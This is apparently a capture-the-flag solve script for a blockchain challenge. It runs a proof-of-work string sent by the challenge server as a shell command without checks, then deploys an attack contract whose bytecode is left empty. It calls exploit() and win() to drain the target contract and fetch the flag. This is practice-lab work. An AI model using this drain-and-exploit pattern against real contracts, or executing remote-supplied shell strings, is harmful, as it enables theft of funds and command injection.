import web3
import json
from pwn import *
import subprocess
from solcx import compile_source, install_solc

IP = "localhost"
PORT = 50000

io = remote(IP, PORT)

io.sendlineafter(b"> ", b"1")

pow_yay = io.recvline()[:-1].decode()
pow_res = subprocess.check_output(pow_yay, shell=True).decode().strip()
io.sendlineafter(b"Solution please: ", pow_res)

io.recvuntil(b"Blockchain info:\n")

uuid = io.recvline().strip().decode().split(" ")[-1]
rpc = io.recvline().strip().decode().split(" ")[-1]
rpc = rpc.replace("[ip]", IP)
private_key = io.recvline().strip().decode().split(" ")[-1]
my_addr = io.recvline().strip().decode().split(" ")[-1]
target_addr = io.recvline().strip().decode().split(" ")[-1]

print(f"{uuid = }")
print(f"{rpc = }")
print(f"{private_key = }")
print(f"{my_addr = }")
print(f"{target_addr = }")

with open("SL.json", "r") as openfile:
    SL_abi = json.load(openfile)

with open("Setup.json", "r") as openfile:
    setup_abi = json.load(openfile)

with open("Solve.json", "r") as openfile:
    solve_abi = json.load(openfile)


w3 = web3.Web3(web3.HTTPProvider(rpc))
setup_contract = w3.eth.contract(address=target_addr, abi=setup_abi)
my_addr = w3.eth.account.from_key(private_key).address

sl_addr = setup_contract.functions.sl().call()
print(f"{sl_addr = }")

contract = w3.eth.contract(address=sl_addr, abi=SL_abi)

print("My initial balance:", w3.eth.get_balance(my_addr) / 10**18)

setup_contract.functions.hello().transact({"from": my_addr, "gas": 1000000})

solved = setup_contract.functions.isSolved().call()
print("Is solved?", solved)

#################

# Använde remix.ethereum.org för få ut bytecode och abi
solve_bytecode = ""

solve_contract = w3.eth.contract(abi=solve_abi, bytecode=solve_bytecode)
tx_hash = solve_contract.constructor(sl_addr,target_addr).transact({"from": my_addr, "gas": 1000000,"value": 95*10**18})

tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

solver = w3.eth.contract(address=tx_receipt.contractAddress, abi=solve_abi)
print("Contract balance at creation:", w3.eth.get_balance(solver.address) / 10**18)
print("My balance after creation:", w3.eth.get_balance(my_addr) / 10**18)

solver.functions.exploit().transact({"from": my_addr})

print("Contract balance after exploit:", w3.eth.get_balance(solver.address) / 10**18)

solver.functions.win().transact({"from": my_addr})

print("Contract balance after win:", w3.eth.get_balance(solver.address) / 10**18)

##############


solved = setup_contract.functions.isSolved().call()
print("Is solved?", solved)

if solved:
    io.close()
    io = remote(IP, PORT)
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b": ", uuid.encode())

io.interactive()
